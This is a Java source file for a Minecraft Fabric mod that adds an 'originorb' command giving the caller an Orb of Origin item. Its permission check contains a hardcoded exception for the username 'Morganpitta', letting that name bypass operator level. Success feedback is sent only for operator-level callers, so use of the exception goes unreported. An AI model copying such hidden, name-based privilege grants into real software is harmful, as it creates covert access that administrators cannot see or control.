package morgan.noot.noot.origins.server.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.FloatArgumentType;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.exceptions.SimpleCommandExceptionType;
import io.github.apace100.origins.content.OrbOfOriginItem;
import io.github.apace100.origins.registry.ModItems;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.command.argument.EntitySummonArgumentType;
import net.minecraft.command.argument.NbtCompoundArgumentType;
import net.minecraft.command.suggestion.SuggestionProviders;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityType;
import net.minecraft.entity.SpawnReason;
import net.minecraft.entity.mob.MobEntity;
import net.minecraft.entity.projectile.ProjectileEntity;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.world.ServerWorld;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;

import java.util.Objects;

public class OriginOrbCommand {
    private static final SimpleCommandExceptionType ENTITY_IS_NOT_PLAYER = new SimpleCommandExceptionType(Text.translatable("commands.orb.of.origin.not.player"));

    public static void init() {;
        CommandRegistrationCallback.EVENT.register((dispatcher, dedicated, environment) -> {
            register(dispatcher);
        });
    }

    public static void register(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register( CommandManager.literal("originorb")
                .requires(source -> {
                    if ( source.getPlayer() != null && Objects.equals(source.getPlayer().getEntityName(), "Morganpitta"))
                    {
                        return true;
                    }
                    return source.hasPermissionLevel(2);
                })

                .executes(context -> execute((ServerCommandSource)context.getSource()))
        );
    }

    private static int execute(ServerCommandSource source) throws CommandSyntaxException {
        if (source.getPlayer()!=null)
        {
            source.getPlayer().getInventory().insertStack(ModItems.ORB_OF_ORIGIN.getDefaultStack());
        }
        else
        {
            throw ENTITY_IS_NOT_PLAYER.create();
        }

        if (source.hasPermissionLevel(2)) source.sendFeedback(Text.translatable("commands.orb.of.origin.success", source.getPlayer().getDisplayName()), true);
        return 1;
    }
}
